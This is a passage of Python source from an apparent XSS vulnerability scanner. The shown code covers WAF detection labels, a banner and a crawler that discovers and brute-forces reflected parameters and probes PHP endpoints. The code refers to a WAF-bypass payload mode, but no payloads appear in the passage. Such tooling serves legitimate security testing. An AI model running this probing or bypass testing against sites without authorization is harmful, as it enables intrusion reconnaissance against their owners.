            'squidproxy': '🦑 SquidProxy IDS',
            'transip': '🌐 TransIP WAF',
            'uewaf': '☁️ UEWaf/UCloud',
            'urlmaster': '🔗 URLMaster',
            'urlscan': '🔍 Microsoft URLScan',
            'utm': '🛡️ Sophos UTM',
            'webknight': '⚔️ WebKnight',
            'webland': '🌐 WebLand',
            'webtotem': '🗿 WebTotem',
            'xlabs': '🔬 XLabs Security',
            'yxlink': '🔗 YXLink',
            'zscaler': '☁️ ZScaler',
            'aesecure': '🔒 aeSecure',
            'eeye': '👁️ eEye SecureIIS',
            'pksecurity': '🔐 pkSecurity IDS',
            'shieldon': '🛡️ Shieldon',
            'azion': '🌐 Azion Edge',
            'isa_server': '🖥️ Microsoft ISA',
            'request_validation': '📋 ASP.NET Validation',
            'wts_waf': '🛡️ WTS-WAF',
            'viettel': '🌐 Viettel/Cloudrity',
            'aspa': '🛡️ ASPA Firewall',
            'ace_xml': '🌐 Cisco ACE XML',
            'asp_net': '📋 ASP.NET Generic',
            # Generic
            'generic_waf': '⚠️ Generic WAF',
        }
        
        primary_waf = waf_names.get(detected_wafs[0], detected_wafs[0].upper())
        
        print(f"\n{Fore.RED}+{'-'*68}+{Style.RESET_ALL}")
        print(f"{Fore.RED}|{' '*20}🛡️  WAF DETECTED 🛡️{' '*26}|{Style.RESET_ALL}")
        print(f"{Fore.RED}+{'-'*68}+{Style.RESET_ALL}")
        print(f"{Fore.RED}| {Fore.WHITE}Primary WAF:    {Fore.YELLOW}{primary_waf:<51}|{Style.RESET_ALL}")
        
        if len(detected_wafs) > 1:
            others = ', '.join([waf_names.get(w, w) for w in detected_wafs[1:]])
            if len(others) > 48:
                others = others[:45] + '...'
            print(f"{Fore.RED}| {Fore.WHITE}Also detected:  {Fore.CYAN}{others:<51}|{Style.RESET_ALL}")
        
        if self.waf_bypass:
            print(f"{Fore.RED}| {Fore.WHITE}Status:         {Fore.GREEN}{'WAF BYPASS MODE ENABLED':<51}|{Style.RESET_ALL}")
            print(f"{Fore.RED}| {Fore.WHITE}Bypass Payloads:{Fore.YELLOW}{len(self.WAF_BYPASS_PAYLOADS):<52}|{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}| {Fore.WHITE}Status:         {Fore.YELLOW}{'Use --waf-bypass to enable bypass payloads':<51}|{Style.RESET_ALL}")
        
        print(f"{Fore.RED}+{'-'*68}+{Style.RESET_ALL}")
        
    def _normalize_url(self, url):
        """Normalize the target URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _is_same_domain(self, url):
        """Check if URL belongs to the target domain"""
        target_domain = urlparse(self.target).netloc
        url_domain = urlparse(url).netloc
        return url_domain == target_domain or url_domain.endswith('.' + target_domain)
    
    def _get_base_url(self, url):
        """Get base URL without parameters"""
        parsed = urlparse(url)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
    
    def print_banner(self):
        """Print the scanner banner with creative styling"""
        # Rainbow gradient for creator name - each letter different color
        rainbow_name = (
            f"{Fore.MAGENTA}S{Fore.CYAN}u{Fore.GREEN}b{Fore.YELLOW}h{Fore.RED}a{Fore.MAGENTA}j{Fore.CYAN}i{Fore.GREEN}t"
        )
        
        banner = rf"""
{Fore.CYAN}{Style.BRIGHT}╔{'═'*69}╗
║{Fore.YELLOW}   ≋★                                                          ★≋    {Fore.CYAN}║
║{Fore.GREEN}   ██╗  ██╗███████╗███████╗    {Fore.WHITE}███████╗ ██████╗ █████╗ ███╗   ██╗    {Fore.CYAN}║
║{Fore.GREEN}   ╚██╗██╔╝██╔════╝██╔════╝    {Fore.WHITE}██╔════╝██╔════╝██╔══██╗████╗  ██║    {Fore.CYAN}║
║{Fore.GREEN}    ╚███╔╝ ███████╗███████╗    {Fore.WHITE}███████╗██║     ███████║██╔██╗ ██║    {Fore.CYAN}║
║{Fore.GREEN}    ██╔██╗ ╚════██║╚════██║    {Fore.WHITE}╚════██║██║     ██╔══██║██║╚██╗██║    {Fore.CYAN}║
║{Fore.GREEN}   ██╔╝ ██╗███████║███████║    {Fore.WHITE}███████║╚██████╗██║  ██║██║ ╚████║    {Fore.CYAN}║
║{Fore.GREEN}   ╚═╝  ╚═╝╚══════╝╚══════╝    {Fore.WHITE}╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    {Fore.CYAN}║
║                                                                     ║
║{Fore.YELLOW}   [+] {Fore.WHITE}Advanced XSS Vulnerability Scanner for Linux                  {Fore.CYAN}║
║{Fore.YELLOW}   [+] {Fore.WHITE}Automatic Parameter Discovery & Payload Testing               {Fore.CYAN}║
║{Fore.YELLOW}   [+] {Fore.WHITE}40+ WAF Detection & Context-Aware Assessment Capabilities              {Fore.CYAN}║
║{Fore.YELLOW}   [+] {Fore.WHITE}Enhanced Auto-Crawl for PHP MVC Endpoints                     {Fore.CYAN}║
║                                                                     ║
║      {Fore.CYAN}<{Fore.MAGENTA}/{Fore.CYAN}> {Fore.WHITE}Code by {Fore.WHITE}Subhajit {Fore.WHITE}- {Fore.GREEN}Security Research {Fore.CYAN}<{Fore.MAGENTA}/{Fore.CYAN}>{Fore.CYAN}                   ║
║                                                                     ║
║           {Fore.YELLOW}[!] {Fore.RED}For Authorized Security Testing Only{Fore.YELLOW} [!]{Fore.CYAN}              ║
║{Fore.YELLOW}   ≋★                                                          ★≋    {Fore.CYAN}║
╚{'═'*69}╝{Style.RESET_ALL}
{Fore.GREEN}{Style.RESET_ALL}
"""
        print(banner)
    
    def crawl(self):
        """Crawl the target website to discover URLs and parameters"""
        print(f"\n{Fore.CYAN}[*] Starting crawl on: {Fore.WHITE}{self.target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Max depth: {Fore.WHITE}{self.max_depth}{Style.RESET_ALL}\n")
        
        queue = deque([(self.target, 0)])
        
        # Seed crawl with Wayback URLs if enabled (LIMITED to prevent hang)
        if self.param_discovery:
            historical_urls = self._extract_wayback_params(self.target)
            
            # Determine limit logic
            urls_to_add = []
            limit_msg = ""
            
            if str(self.wayback_limit).lower() == 'all':
                urls_to_add = historical_urls
                limit_msg = "unlimited"
            else:
                try:
                    limit_val = int(self.wayback_limit)
                    urls_to_add = historical_urls[:limit_val]
                    limit_msg = f"{limit_val}"
                except ValueError:
                    urls_to_add = historical_urls[:50] # Fallback
                    limit_msg = "50 (fallback)"

            added_count = 0
            for hist_url in urls_to_add:
                if self._is_same_domain(hist_url):
                    queue.append((hist_url, 1))  # Add at depth 1 to limit further crawling
                    added_count += 1
            
            if added_count > 0:
                print(f"{Fore.YELLOW}[*] Added {added_count} Wayback URLs to queue (Limit: {limit_msg}){Style.RESET_ALL}")
                if len(historical_urls) > added_count:
                    print(f"{Fore.YELLOW}[*] ... skipped {len(historical_urls) - added_count} older URLs to prevent hang (use --wayback-limit 'all' to scan everything){Style.RESET_ALL}")
        
        crawl_count = 0
        total_queued = len(queue)
        
        while queue:
            url, depth = queue.popleft()
            crawl_count += 1
            
            # Progress indicator to show scanner is not stuck
            if crawl_count % 5 == 0 or crawl_count <= 3:
                print(f"{Fore.BLUE}[*] Crawling... [{crawl_count} pages processed]{Style.RESET_ALL}", end='\r')
            
            if depth > self.max_depth:
                continue
                
            base_url = self._get_base_url(url)
            # Capture query parameters/templates before de-duplicating by base
            # path or making the network request. This retains parameters from
            # alternate links and endpoints that return non-200 responses.
            self._extract_url_params(url)
            if base_url in self.visited:
                continue
                
            self.visited.add(base_url)
            
            try:
                if self.verbose:
                    print(f"{Fore.BLUE}[~] Crawling: {url}{Style.RESET_ALL}")
                
                response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
                
                if response.status_code != 200:
                    continue
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract forms and their parameters
                self._extract_forms(url, soup)
                
                # ADVANCED PARAMETER DISCOVERY
                if self.param_discovery:
                    # Extract params from JavaScript
                    self._extract_js_params(url, soup)
                    
                    # Extract params from data-* attributes
                    self._extract_data_attributes(url, soup)
                    
                    # Extract params from all links
                    self._extract_link_params(url, soup)
                    
                    # Extract params from HTML comments
                    self._extract_html_comments(url, soup)
                    
                    # Extract params from meta tags
                    self._extract_meta_params(url, soup)
                    
                    # Extract params from window/config objects
                    self._extract_window_variables(url, soup)
                    
                    # Extract API endpoint params
                    self._extract_api_endpoints(url, soup)
                    
                    # Extract event handler params
                    self._extract_event_handlers(url, soup)
                    
                    # Extract hidden input params
                    self._extract_input_patterns(url, soup)
                
                # Find all links
                for link in soup.find_all('a', href=True):
                    next_url = urljoin(url, link['href'])
                    if self._is_same_domain(next_url) and self._get_base_url(next_url) not in self.visited:
                        queue.append((next_url, depth + 1))
                        self._extract_url_params(next_url)
                
                # Find links in JavaScript
                scripts = soup.find_all('script')
                for script in scripts:
                    if script.string:
                        urls = re.findall(r'["\']([^"\']*\?[^"\']+)["\']', script.string)
                        for found_url in urls:
                            if found_url.startswith('/'):
                                found_url = urljoin(url, found_url)
                            if self._is_same_domain(found_url):
                                self._extract_url_params(found_url)
                
                time.sleep(0.1)  # Be nice to the server
                
            except requests.exceptions.RequestException as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Error crawling {url}: {e}{Style.RESET_ALL}")
                continue
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Unexpected error: {e}{Style.RESET_ALL}")
                continue
        
        print(f"\n{Fore.GREEN}[+] Crawling complete!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Pages visited: {Fore.WHITE}{len(self.visited)}{Style.RESET_ALL}")
        
        # Count initial params from crawling
        initial_params = sum(len(p['get']) + len(p['post']) for p in self.found_params.values())
        if initial_params > 0:
            print(f"{Fore.GREEN}[+] Parameters found during crawl: {Fore.WHITE}{initial_params}{Style.RESET_ALL}")
        
        # ADVANCED PARAMETER DISCOVERY (runs by default)
        if self.param_discovery:
            print(f"\n{Fore.CYAN}[*] Running advanced parameter discovery...{Style.RESET_ALL}")
            
            # Extract from robots.txt and sitemap.xml
            self._extract_robots_sitemap(self.target)
            
            # Mine for reflected parameters using smart wordlist
            self._mine_reflected_params(self.target)
            

        
        # Brute-force common parameters ONCE on the main target (not every page)
        if self.brute_params:
            self._bruteforce_common_params(self.target)
        
        # ENHANCED AUTO-CRAWL: Discover PHP MVC-style endpoints
        if self.param_discovery:
            # Try to get fresh soup for PHP endpoint discovery
            try:
                response = self.session.get(self.target, timeout=self.timeout, verify=False)
                soup = BeautifulSoup(response.text, 'html.parser')
                self._discover_php_endpoints(self.target, soup)
            except:
                self._discover_php_endpoints(self.target, None)
        
        # Show FINAL parameter count after all discovery
        total_params = sum(len(p['get']) + len(p['post']) for p in self.found_params.values())
        print(f"\n{Fore.GREEN}[+] Total parameters discovered: {Fore.WHITE}{total_params}{Style.RESET_ALL}")
    
    def _extract_url_params(self, url):
        """Extract GET parameters and retain a bounded, in-memory URL template."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if params:
            base_url = self._get_base_url(url)
            if base_url not in self.found_params:
                self.found_params[base_url] = {'get': set(), 'post': set()}

            # Keep up to ten distinct real query templates per endpoint. The
            # audit replaces one parameter at a time while preserving sibling
            # query arguments that the endpoint may require. These samples are
            # process-local and are never added to exported reports.
            templates = self.get_query_templates.setdefault(base_url, [])
            template_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, parsed.query, ''))
            if template_url not in templates and len(templates) < 10:
                templates.append(template_url)

            for param in params.keys():
                self.found_params[base_url]['get'].add(param)
                if self.verbose:
                    print(f"{Fore.GREEN}[+] Found GET param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
    
    def _extract_forms(self, url, soup):
        """Extract forms and their input parameters"""
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            base_url = self._get_base_url(form_url)
            
            if base_url not in self.found_params:
                self.found_params[base_url] = {'get': set(), 'post': set()}
            
            # Extract input fields
            inputs = form.find_all(['input', 'textarea', 'select'])
            for inp in inputs:
                name = inp.get('name')
                if name:
                    param_type = 'post' if method == 'post' else 'get'
                    self.found_params[base_url][param_type].add(name)
                    self.discovered_params.add(name)
                    if self.verbose:
                        print(f"{Fore.GREEN}[+] Found {param_type.upper()} param: {Fore.WHITE}{name} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
    
    def _extract_js_params(self, url, soup):
        """Extract parameters from JavaScript code - ADVANCED"""
        scripts = soup.find_all('script')
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        for script in scripts:
            if script.string:
                js_code = script.string
                
                # Pattern 1: URL query params in JS (url?param=value)
                url_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)\s*=', js_code)
                for param in url_params:
                    if param not in ['http', 'https', 'true', 'false', 'null', 'undefined']:
                        self.found_params[base_url]['get'].add(param)
                        self.discovered_params.add(param)
                        if self.verbose:
                            print(f"{Fore.MAGENTA}[+] JS param (URL): {Fore.WHITE}{param} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
                
                # Pattern 2: AJAX/fetch data objects
                ajax_params = re.findall(r'["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']:\s*["\']?[^,}\]]+["\']?', js_code)
                for param in ajax_params[:20]:  # Limit to avoid noise
                    if len(param) > 1 and len(param) < 30:
                        self.found_params[base_url]['post'].add(param)
                        self.discovered_params.add(param)
                        if self.verbose:
                            print(f"{Fore.MAGENTA}[+] JS param (AJAX): {Fore.WHITE}{param} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
                
                # Pattern 3: jQuery/JS selectors with name/id
                selector_params = re.findall(r'\$\(["\'][#.]?([a-zA-Z_][a-zA-Z0-9_]*)["\']', js_code)
                for param in selector_params[:10]:
                    if len(param) > 1:
                        self.found_params[base_url]['get'].add(param)
                        self.discovered_params.add(param)
                
                # Pattern 4: document.getElementById/querySelector
                dom_params = re.findall(r'getElementById\(["\']([^"\']+)["\']', js_code)
                dom_params += re.findall(r'querySelector\(["\'][#]?([a-zA-Z_][a-zA-Z0-9_]*)', js_code)
                for param in dom_params[:10]:
                    self.found_params[base_url]['get'].add(param)
                    self.discovered_params.add(param)
                
                # Pattern 5: FormData append
                formdata_params = re.findall(r'\.append\(["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']', js_code)
                for param in formdata_params:
                    self.found_params[base_url]['post'].add(param)
                    self.discovered_params.add(param)
                    if self.verbose:
                        print(f"{Fore.MAGENTA}[+] JS param (FormData): {Fore.WHITE}{param} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
                
                # Pattern 6: URLSearchParams
                urlsearch_params = re.findall(r'URLSearchParams.*?["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']', js_code, re.DOTALL)
                for param in urlsearch_params[:10]:
                    self.found_params[base_url]['get'].add(param)
                    self.discovered_params.add(param)
    
    def _extract_data_attributes(self, url, soup):
        """Extract parameters from HTML data-* attributes"""
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        # Find all elements with data attributes
        all_elements = soup.find_all(True)
        for elem in all_elements:
            for attr_name, attr_value in elem.attrs.items():
                if attr_name.startswith('data-'):
                    # The data attribute itself might be a param
                    param_name = attr_name.replace('data-', '')
                    if param_name and len(param_name) > 1:
                        self.found_params[base_url]['get'].add(param_name)
                        self.discovered_params.add(param_name)
                    
                    # Check for params in data attribute values (URLs)
                    if isinstance(attr_value, str) and '?' in attr_value:
                        url_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', attr_value)
                        for param in url_params:
                            self.found_params[base_url]['get'].add(param)
                            self.discovered_params.add(param)
                            if self.verbose:
                                print(f"{Fore.YELLOW}[+] Data attr param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
    
    def _extract_link_params(self, url, soup):
        """Extract parameters from all href and src attributes"""
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        # Find all links with query params
        for tag in ['a', 'link', 'script', 'img', 'iframe', 'frame', 'source', 'video', 'audio']:
            for elem in soup.find_all(tag):
                for attr in ['href', 'src', 'action', 'data-src', 'data-href', 'data-url']:
                    attr_value = elem.get(attr)
                    if attr_value and '?' in str(attr_value):
                        url_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', str(attr_value))
                        for param in url_params:
                            self.found_params[base_url]['get'].add(param)
                            self.discovered_params.add(param)
    
    def _extract_html_comments(self, url, soup):
        """Extract potential parameters from HTML comments"""
        from bs4 import Comment
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        for comment in comments:
            # Look for param patterns in comments
            params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', str(comment))
            params += re.findall(r'param[eter]*[\s:=]+["\']?([a-zA-Z_][a-zA-Z0-9_]*)', str(comment), re.I)
            for param in params[:5]:  # Limit
                if len(param) > 1 and len(param) < 30:
                    self.found_params[base_url]['get'].add(param)
                    self.discovered_params.add(param)
                    if self.verbose:
                        print(f"{Fore.BLUE}[+] Comment param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
    
    def _bruteforce_common_params(self, url):
        """Test common XSS-prone parameters to discover hidden inputs"""
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        print(f"\n{Fore.CYAN}[*] Brute-forcing {len(self.COMMON_XSS_PARAMS)} common parameters...{Style.RESET_ALL}")
        
        found_count = 0
        test_value = 'xsstest123'
        
        # Test in batches of 10 params at once for efficiency
        batch_size = 10
        for i in range(0, min(len(self.COMMON_XSS_PARAMS), 100), batch_size):
            batch = self.COMMON_XSS_PARAMS[i:i+batch_size]
            params = {p: test_value for p in batch}
            
            try:
                response = self.session.get(url, params=params, timeout=self.timeout, verify=False)
                response_text = response.text.lower()
                
                # Check which params are reflected
                for param in batch:
                    if test_value.lower() in response_text:
                        # This batch has reflections, test individually
                        for p in batch:
                            try:
                                single_response = self.session.get(url, params={p: test_value}, timeout=self.timeout, verify=False)
                                if test_value.lower() in single_response.text.lower():
                                    self.found_params[base_url]['get'].add(p)
                                    self.discovered_params.add(p)
                                    found_count += 1
                                    print(f"{Fore.GREEN}[+] Discovered reflected param: {Fore.WHITE}{p} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
                            except:
                                continue
                        break
                        
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
        
        if found_count > 0:
            print(f"{Fore.GREEN}[+] Discovered {found_count} reflected parameters!{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[~] No additional reflected parameters found via brute-force{Style.RESET_ALL}")
    
    def _discover_php_endpoints(self, base_domain, soup=None):
        """Discover PHP MVC-style endpoints with query parameters - ADVANCED AUTO-CRAWL"""
        from urllib.parse import urlparse, urljoin, quote
        
        found_endpoints = set()
        found_params_count = 0
        
        print(f"\n{Fore.CYAN}[*] Running enhanced auto-crawl for PHP endpoints...{Style.RESET_ALL}")
        
        # Common PHP MVC patterns to look for
        php_mvc_patterns = [
            '/index.php/',
            '/admin.php/',
            '/api.php/',
            '/controller.php/',
            '/module.php/',
            '/page.php/',
        ]
        
        # Common controller/method paths found in PHP MVC frameworks
        common_controllers = [
            'Homepage_frontend_control',
            'user', 'users', 'admin', 'api', 'ajax', 'search', 'page',
            'content', 'article', 'articles', 'news', 'post', 'posts',
            'category', 'categories', 'product', 'products', 'item', 'items',
            'profile', 'account', 'login', 'logout', 'register', 'auth',
            'file', 'files', 'download', 'upload', 'media', 'image', 'images',
            'gallery', 'album', 'video', 'videos', 'audio',
            'blog', 'forum', 'comment', 'comments', 'review', 'reviews',
            'contact', 'feedback', 'support', 'help', 'faq',
            'store', 'shop', 'cart', 'checkout', 'order', 'orders',
            'dashboard', 'panel', 'manage', 'settings', 'config',
        ]
        
        # Common methods/actions
        common_actions = [
            'index', 'view', 'show', 'list', 'get', 'read',
            'create', 'add', 'new', 'insert', 'store',
            'edit', 'update', 'modify', 'change',
            'delete', 'remove', 'destroy',
            'search', 'filter', 'find', 'query',
            'students', 'teachers', 'faculty', 'staff', 'members',
            'details', 'info', 'data', 'result', 'results',
            'download', 'export', 'print', 'pdf',
        ]
        
        # Common XSS-prone parameter names to test
        xss_params = [
            'key', 'id', 'page', 'p', 'q', 'search', 'query', 'keyword', 'keywords',
            's', 'term', 'text', 'title', 'name', 'value', 'content', 'data',
            'message', 'msg', 'body', 'comment', 'desc', 'description',
            'url', 'link', 'redirect', 'return', 'returnUrl', 'return_url', 'next',
            'ref', 'referrer', 'r', 'path', 'file', 'filename', 'dir', 'directory',
            'action', 'type', 'cat', 'category', 'tag', 'filter', 'sort', 'order',
            'user', 'username', 'email', 'phone', 'address', 'city', 'country',
            'callback', 'cb', 'jsonp', 'format', 'output', 'template', 'view',
            'lang', 'language', 'locale', 'l', 'debug', 'test', 'mode',
        ]
        
        parsed = urlparse(base_domain)
        domain_base = f"{parsed.scheme}://{parsed.netloc}"
        
        # STEP 1: Extract PHP endpoints from the page HTML if soup provided
        if soup:
            # Find all links with .php patterns
            for link in soup.find_all('a', href=True):
                href = link['href']
                if '.php' in href.lower():
                    full_url = urljoin(base_domain, href)
                    found_endpoints.add(full_url)
                    if self.verbose:
                        print(f"{Fore.BLUE}[~] Found PHP endpoint: {full_url}{Style.RESET_ALL}")
            
            # Look for URLs in JavaScript code
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    # Find PHP URLs in JavaScript
                    php_urls = re.findall(r'["\']([^"\']*\.php[^"\']*)["\']', script.string)
                    for php_url in php_urls:
                        if php_url.startswith('/') or php_url.startswith('http'):
                            full_url = urljoin(base_domain, php_url)
                            found_endpoints.add(full_url)
                    
                    # Find MVC-style paths in JavaScript
                    mvc_paths = re.findall(r'["\'](/index\.php/[^"\']+)["\']', script.string)
                    for mvc_path in mvc_paths:
                        full_url = urljoin(domain_base, mvc_path)
                        found_endpoints.add(full_url)
        
        # STEP 2: Try common MVC endpoint patterns
        test_value = 'xsstest123'
        tested_endpoints = set()
        
        # Build potential MVC URL patterns to test
        potential_urls = []
        
        # Test the main index.php with common controller/action patterns
        for controller in common_controllers[:15]:  # Limit to avoid too many requests
            for action in common_actions[:10]:
                potential_url = f"{domain_base}/index.php/{controller}/{action}"
                potential_urls.append(potential_url)
        
        # Add discovered endpoints from HTML
        potential_urls.extend(list(found_endpoints)[:50])
        
        print(f"{Fore.CYAN}[*] Testing {len(potential_urls)} potential PHP endpoints...{Style.RESET_ALL}")
        
        # STEP 3: Test each potential endpoint with common XSS parameters
        for endpoint_url in potential_urls:
            if endpoint_url in tested_endpoints:
                continue
            tested_endpoints.add(endpoint_url)
            
            # Get base URL without parameters
            base_endpoint = endpoint_url.split('?')[0]
            
            if base_endpoint not in self.found_params:
                self.found_params[base_endpoint] = {'get': set(), 'post': set()}
            
            # First, check if the endpoint is accessible
            try:
                response = self.session.get(base_endpoint, timeout=self.timeout, verify=False)
                if response.status_code >= 400:
                    continue
                    
                # Test common XSS-prone parameters on this endpoint
                for param in xss_params[:20]:  # Test top 20 parameters
                    try:
                        test_url = f"{base_endpoint}?{param}={test_value}"
                        param_response = self.session.get(test_url, timeout=self.timeout, verify=False)
                        
                        # Check if the test value is reflected
                        if test_value.lower() in param_response.text.lower():
                            self.found_params[base_endpoint]['get'].add(param)
                            self.discovered_params.add(param)
                            found_params_count += 1
                            if self.verbose:
                                print(f"{Fore.GREEN}[+] AUTO-CRAWL: Found reflected param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_endpoint}{Style.RESET_ALL}")
                            
                            # Add this endpoint to visited for XSS testing
                            self.visited.add(base_endpoint)
                            
                    except requests.exceptions.RequestException:
                        continue
                    except Exception:
                        continue
                        
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
            
            # Small delay to be nice to the server
            time.sleep(0.05)
        
        # STEP 4: Specifically test the patterns mentioned by user
        specific_patterns = [
            f"{domain_base}/index.php/Homepage_frontend_control/students",
            f"{domain_base}/index.php/Homepage_frontend_control/faculty",
            f"{domain_base}/index.php/Homepage_frontend_control/news",
            f"{domain_base}/index.php/Homepage_frontend_control/events",
            f"{domain_base}/index.php/Homepage_frontend_control/gallery",
            f"{domain_base}/index.php/Homepage_frontend_control/notice",
        ]
        
        for pattern_url in specific_patterns:
            if pattern_url in tested_endpoints:
                continue
            
            base_endpoint = pattern_url.split('?')[0]
            if base_endpoint not in self.found_params:
                self.found_params[base_endpoint] = {'get': set(), 'post': set()}
            
            try:
                response = self.session.get(pattern_url, timeout=self.timeout, verify=False)
                if response.status_code < 400:
                    # Test with 'key' parameter specifically
                    test_url = f"{pattern_url}?key={test_value}"
                    param_response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    if test_value.lower() in param_response.text.lower():
                        self.found_params[base_endpoint]['get'].add('key')
                        self.discovered_params.add('key')
                        found_params_count += 1
                        self.visited.add(base_endpoint)
                        if self.verbose:
                            print(f"{Fore.GREEN}[+] AUTO-CRAWL: Found reflected 'key' param @ {Fore.WHITE}{pattern_url}{Style.RESET_ALL}")
                    
                    # Also test other common params
                    for param in ['id', 'page', 'search', 'q', 'name']:
                        try:
                            test_url = f"{pattern_url}?{param}={test_value}"
                            param_response = self.session.get(test_url, timeout=self.timeout, verify=False)
                            
                            if test_value.lower() in param_response.text.lower():
                                self.found_params[base_endpoint]['get'].add(param)
                                self.discovered_params.add(param)
                                found_params_count += 1
                                if self.verbose:
                                    print(f"{Fore.GREEN}[+] AUTO-CRAWL: Found reflected param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_endpoint}{Style.RESET_ALL}")
                        except:
                            continue
                            
            except:
                continue
        
        if found_params_count > 0:
            if self.verbose:
                print(f"\n{Fore.GREEN}[+] AUTO-CRAWL: Discovered {found_params_count} reflected parameters on PHP endpoints!{Style.RESET_ALL}")
        else:
            if self.verbose:
                print(f"{Fore.YELLOW}[~] AUTO-CRAWL: No additional PHP endpoint parameters found{Style.RESET_ALL}")
        
        return found_params_count
    
    def _extract_meta_params(self, url, soup):
        """Extract potential parameters from meta tags"""
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        meta_tags = soup.find_all('meta')
        for meta in meta_tags:
            content = meta.get('content', '')
            if '?' in content:
                params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', content)
                for param in params:
                    self.found_params[base_url]['get'].add(param)
                    self.discovered_params.add(param)
    
    def _extract_window_variables(self, url, soup):
        """Extract parameters from window/document JS objects - ADVANCED"""
        scripts = soup.find_all('script')
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        for script in scripts:
            if script.string:
                js_code = script.string
                
                # Pattern: window.config, window.settings, window.params objects
                config_patterns = [
                    r'window\.(?:config|settings|params|data|options)\s*=\s*\{([^}]+)\}',
                    r'var\s+(?:config|settings|params|data|options)\s*=\s*\{([^}]+)\}',
                    r'const\s+(?:config|settings|params|data|options)\s*=\s*\{([^}]+)\}',
                    r'let\s+(?:config|settings|params|data|options)\s*=\s*\{([^}]+)\}',
                ]
                
                for pattern in config_patterns:
                    matches = re.findall(pattern, js_code, re.IGNORECASE)
                    for match in matches:
                        # Extract keys from the object
                        keys = re.findall(r'["\']?([a-zA-Z_][a-zA-Z0-9_]*)["\']?\s*:', match)
                        for key in keys[:15]:  # Limit
                            if len(key) > 1 and len(key) < 30:
                                self.found_params[base_url]['get'].add(key)
                                self.discovered_params.add(key)
                                if self.verbose:
                                    print(f"{Fore.MAGENTA}[+] Config param: {Fore.WHITE}{key} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
                
                # Pattern: .get('param'), .getItem('param'), .getAttribute('param')
                getter_params = re.findall(r'\.(?:get|getItem|getAttribute|getParameter)\(["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']', js_code)
                for param in getter_params[:10]:
                    self.found_params[base_url]['get'].add(param)
                    self.discovered_params.add(param)
                
                # Pattern: URLSearchParams.get('param')
                urlsearch_gets = re.findall(r'\.get\(["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']', js_code)
                for param in urlsearch_gets[:10]:
                    self.found_params[base_url]['get'].add(param)
                    self.discovered_params.add(param)
    
    def _extract_api_endpoints(self, url, soup):
        """Extract API endpoints and their parameters - ADVANCED"""
        scripts = soup.find_all('script')
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        for script in scripts:
            if script.string:
                js_code = script.string
                
                # Pattern: fetch/axios/ajax calls with URLs
                api_patterns = [
                    r'fetch\(["\']([^"\']*\?[^"\']+)["\']',
                    r'axios\.(?:get|post|put|delete)\(["\']([^"\']*\?[^"\']+)["\']',
                    r'\$\.(?:get|post|ajax)\(["\']([^"\']*\?[^"\']+)["\']',
                    r'XMLHttpRequest.*?open\(["\'][A-Z]+["\'],\s*["\']([^"\']*\?[^"\']+)["\']',
                ]
                
                for pattern in api_patterns:
                    matches = re.findall(pattern, js_code, re.IGNORECASE)
                    for match in matches:
                        params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', match)
                        for param in params:
                            self.found_params[base_url]['get'].add(param)
                            self.discovered_params.add(param)
                            if self.verbose:
